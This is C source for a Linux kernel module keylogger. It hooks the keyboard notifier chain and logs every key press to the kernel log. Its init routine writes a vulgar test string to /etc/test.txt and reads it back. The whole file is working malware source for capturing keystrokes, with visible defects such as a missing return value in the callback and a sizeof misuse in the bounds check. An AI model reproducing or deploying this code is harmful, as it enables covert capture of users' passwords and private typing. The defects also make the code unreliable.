#include <linux/module.h>
#include <linux/kernel.h>       
#include <linux/init.h>         
#include <linux/keyboard.h>
#include <linux/input.h>
#include "kl_utils.h"

static struct file* file;

static int record_keys(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  
  	if (code == KBD_KEYCODE) {

  	int val = param->value;
  		
	if (isShift(val) && param->down){
        shift_pressed++;
        return 0; 
	}

	if (isShift(val) && !param->down){
		shift_pressed=0;
		return 0;
	}
    
  	if (val <= sizeof(key_names) && param->down){
    	printk(KERN_DEBUG "KEYLOGGER: %s\n", getKeyText(val));
  	}

  }  

}


static struct notifier_block nb = {
  .notifier_call = record_keys
};


static int __init kl_init(void)
{
	mm_segment_t oldfs;
    oldfs = get_fs();
    set_fs(get_ds());

	char read[50];

	file = open_file("/etc/test.txt");

	char* data = "Hello mother fuckers";
	
	write_to_file(file, data, strlen(data));

	read_from_file(file, read, 50);
	close_file(file);
	set_fs(oldfs);
	printk(KERN_DEBUG "Data from file:");
	printk(KERN_DEBUG "%s", read);

    register_keyboard_notifier(&nb);
  	return 0;
}

static void __exit kl_exit(void)
{
	//close_file(file);
    unregister_keyboard_notifier(&nb);
}


MODULE_LICENSE("GPL");
module_init(kl_init);
module_exit(kl_exit);
